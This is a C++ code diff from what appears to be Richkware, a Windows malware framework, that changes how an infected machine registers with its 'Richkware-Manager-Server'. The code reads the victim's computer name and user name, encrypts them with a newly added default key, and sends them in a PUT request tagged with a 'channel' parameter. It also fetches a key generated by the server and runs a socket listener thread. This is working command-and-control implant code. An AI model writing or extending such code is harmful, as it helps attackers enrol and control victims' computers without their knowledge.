@@ -30,6 +30,7 @@ Server &Server::operator=(const Server &server) {
 
 Network &Network::operator=(const Network &network) {
     encryptionKey = network.encryptionKey;
+    defaultEncryptionKey = network.defaultEncryptionKey;
     serverAddress = network.serverAddress;
     port = network.port;
     associatedUser = network.associatedUser;
@@ -49,6 +50,18 @@ Network::Network(const std::string &serverAddressArg, const std::string &portArg
     port = portArg;
     associatedUser = associatedUserArg;
     encryptionKey = encryptionKeyArg;
+    //defaultEncryptionKey = "";
+    server = Server(encryptionKeyArg);
+}
+
+Network::Network(const std::string &serverAddressArg, const std::string &portArg,
+                 const std::string &associatedUserArg,
+                 const std::string &encryptionKeyArg, const std::string &defaultEncryptionKeyArg) {
+    serverAddress = serverAddressArg;
+    port = portArg;
+    associatedUser = associatedUserArg;
+    encryptionKey = encryptionKeyArg;
+    defaultEncryptionKey = defaultEncryptionKeyArg;
     server = Server(encryptionKeyArg);
 }
 
@@ -149,19 +162,20 @@ std::string Network::RawRequest(const std::string &serverAddress, const std::str
 
 
 bool Network::UploadInfoToRMS() {
-    return UploadInfoToRMS(serverAddress, port, associatedUser, server.getPort(), encryptionKey);
+    return UploadInfoToRMS(serverAddress, port, associatedUser, server.getPort(), encryptionKey, defaultEncryptionKey);
 }
 
 bool
 Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &port, const std::string &associatedUser,
-                         const std::string &serverPort, const std::string &encryptionKey) {
+                         const std::string &serverPort, const std::string &encryptionKey,
+                         const std::string &defaultEncryptionKey) {
     Crypto crypto(encryptionKey);
 
     std::string name = getenv("COMPUTERNAME");
     name.append("/");
     name.append(getenv("USERNAME"));
 
-    name = crypto.Encrypt(name);
+    name = crypto.Encrypt(name, defaultEncryptionKey);
 
     // encrypt only serverPort because name is used by the server to recognize the device
     std::string serverPortS = crypto.Encrypt(serverPort);
@@ -173,6 +187,7 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
     std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
                          "&data1=" + serverPortS +
                          "&data2=" + associatedUserS +
+                         "&channel=richkware"
                          " HTTP/1.1\r\n" +
                          "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
@@ -330,7 +345,7 @@ std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddress, c
     std::string key;
 
     // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
-    UploadInfoToRMS(serverAddress, port, associatedUser, "none", encryptionKey);
+    UploadInfoToRMS(serverAddress, port, associatedUser, "none", encryptionKey, encryptionKey);
 
     // Primary key in RMS database.
     std::string name = getenv("COMPUTERNAME");
@@ -469,8 +484,8 @@ std::string Server::getPort() {
 DWORD WINAPI
 
 ServerThread(void *arg) {
-    std::string encryptionKey = (std::string)((*((ServerThreadArgs *) arg)).encryptionKey);
-    SOCKET ListenSocket = (SOCKET)((*((ServerThreadArgs *) arg)).ListenSocket);
+    std::string encryptionKey = (std::string) ((*((ServerThreadArgs *) arg)).encryptionKey);
+    SOCKET ListenSocket = (SOCKET) ((*((ServerThreadArgs *) arg)).ListenSocket);
 
     //HANDLE hClientThreadArray[1000];
     SOCKET ClientSocket = INVALID_SOCKET;
